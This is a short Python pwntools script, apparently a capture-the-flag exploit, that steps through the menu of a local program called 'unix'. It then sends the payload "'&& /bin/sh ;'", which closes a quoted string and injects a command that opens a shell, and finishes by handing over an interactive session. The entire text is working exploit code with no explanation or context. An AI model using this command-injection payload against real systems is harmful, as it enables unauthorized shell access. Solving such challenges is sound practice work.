from pwn import *
p = process("unix")
log.info(p.recvuntil('>'))
p.sendline("1")
log.info(p.recvuntil(':'))
p.sendline("AAAA")
log.info(p.recvuntil('>'))
p.sendline("5")
log.info(p.recvuntil('?'))
p.sendline("N")
log.info(p.recvuntil('>'))
p.sendline("3")
log.info(p.recvuntil(':'))
payload = "'&& /bin/sh ;'"
p.sendline(payload)
log.info(p.recvuntil('>'))
p.sendline("4")
p.interactive()


